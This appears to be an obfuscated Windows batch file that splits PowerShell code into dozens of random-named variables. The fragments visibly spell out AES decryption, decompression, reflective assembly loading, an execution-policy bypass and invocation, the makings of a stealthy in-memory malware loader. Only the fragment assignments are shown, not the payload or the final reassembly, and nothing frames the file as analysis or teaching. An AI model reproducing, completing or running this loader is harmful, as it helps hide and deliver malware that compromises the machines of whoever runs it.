@echo off
!ysgchHWyGarQTJdOJVAy! "ZPeGbnvnRN=-1.."
!ysgchHWyGarQTJdOJVAy! "EVMHIqSNmg=s_va"
!ysgchHWyGarQTJdOJVAy! "CEzSZePajW=le ="
!ysgchHWyGarQTJdOJVAy! "pSjLAqsIJl=I);	"
!ysgchHWyGarQTJdOJVAy! "jchvsRBkiJ=load"
!ysgchHWyGarQTJdOJVAy! "etVPhgJIFA=ar=["
!ysgchHWyGarQTJdOJVAy! "giZDgsElFl=ncti"
!ysgchHWyGarQTJdOJVAy! "DpytEHmkjo=('If"
!ysgchHWyGarQTJdOJVAy! "zslmlRucWl=-1.."
!ysgchHWyGarQTJdOJVAy! "nCOmtpqJHo=on.G"
!ysgchHWyGarQTJdOJVAy! "jGICspmIMy=rn_v"
!ysgchHWyGarQTJdOJVAy! "PytKJNfcGm=.Aes"
!ysgchHWyGarQTJdOJVAy! "wppQRQhPSZ=_var"
!ysgchHWyGarQTJdOJVAy! "ESrImZpyEC=int;"
!ysgchHWyGarQTJdOJVAy! "XZAFthYdPQ=tion"
!ysgchHWyGarQTJdOJVAy! "iSnFLYFYsO=rxhp"
!ysgchHWyGarQTJdOJVAy! "ATdUCVbtHa=($pa"
!ysgchHWyGarQTJdOJVAy! "UWBndESmMd=::('"
!ysgchHWyGarQTJdOJVAy! "LXrdRYWCSw=aram"
!ysgchHWyGarQTJdOJVAy! "taLvesYQOb=HXsJ"
!ysgchHWyGarQTJdOJVAy! "rHHpedkWpD=Secu"
!ysgchHWyGarQTJdOJVAy! "xOibkbIucl=ptog"
!ysgchHWyGarQTJdOJVAy! "FaBJUmuVxv=flec"
!ysgchHWyGarQTJdOJVAy! "cwENjZmEGQ=cute"
!ysgchHWyGarQTJdOJVAy! "PwhAzXfpHS=em.S"
!ysgchHWyGarQTJdOJVAy! "VsEQYIxhEB=ar);"
!ysgchHWyGarQTJdOJVAy! "nPJkRjqmWU=ar=$"
!ysgchHWyGarQTJdOJVAy! "PtvOkxqygj=.Cry"
!ysgchHWyGarQTJdOJVAy! "duDnNdEWyA=ypas"
!ysgchHWyGarQTJdOJVAy! "wJfPxmHvys=ram_"
!ysgchHWyGarQTJdOJVAy! "mxgZOEaLtJ=g(3)"
!ysgchHWyGarQTJdOJVAy! "qxyqxLYiVb=exec"
!ysgchHWyGarQTJdOJVAy! "gVydQalTHl=togr"
!ysgchHWyGarQTJdOJVAy! "cqsekymRad=var="
!ysgchHWyGarQTJdOJVAy! "YDOwlNEDWe=lit("
!ysgchHWyGarQTJdOJVAy! "VGYAKFDIlK=_var"
!ysgchHWyGarQTJdOJVAy! "OJnJZzNUuI=trea"
!ysgchHWyGarQTJdOJVAy! "AYVnxyGZGh=func"
!ysgchHWyGarQTJdOJVAy! "AEtkkiANeu=txeT"
!ysgchHWyGarQTJdOJVAy! "OHDxTIvCEw=se()"
!ysgchHWyGarQTJdOJVAy! "IhyybaddLG=V=[S"
!ysgchHWyGarQTJdOJVAy! "RdnjuAQsTB=ing="
!ysgchHWyGarQTJdOJVAy! "vTBkpTWDMM=]::C"
!ysgchHWyGarQTJdOJVAy! "qSBvqtcQDN=6] -"
!ysgchHWyGarQTJdOJVAy! "SQXKFntfot=]::N"
!ysgchHWyGarQTJdOJVAy! "JdNzVwhrLT=Disp"
!ysgchHWyGarQTJdOJVAy! "QDZwOMItWo=Padd"
!ysgchHWyGarQTJdOJVAy! "pmqSymldzs= ([C"
!ysgchHWyGarQTJdOJVAy! "hDSEsMJacv=reat"
!ysgchHWyGarQTJdOJVAy! "DGvfldTPBm=es_v"
!ysgchHWyGarQTJdOJVAy! "exkDRnTVZl=e]::"
!ysgchHWyGarQTJdOJVAy! "OFDmQLgHGj=pres"
!ysgchHWyGarQTJdOJVAy! "sjHngFVCtB= $pa"
!ysgchHWyGarQTJdOJVAy! "qUekUwUXAD=rray"
!ysgchHWyGarQTJdOJVAy! "qCleFSbRgn= -jo"
!ysgchHWyGarQTJdOJVAy! "bbskvsaaav=($gA"
!ysgchHWyGarQTJdOJVAy! "DiYxLubsoI=();	"
!ysgchHWyGarQTJdOJVAy! "WyJUdcDBva=r.Tr"
!ysgchHWyGarQTJdOJVAy! "InUfpdNDZI=));"
!ysgchHWyGarQTJdOJVAy! "hUScDVXMvE=IO.F"
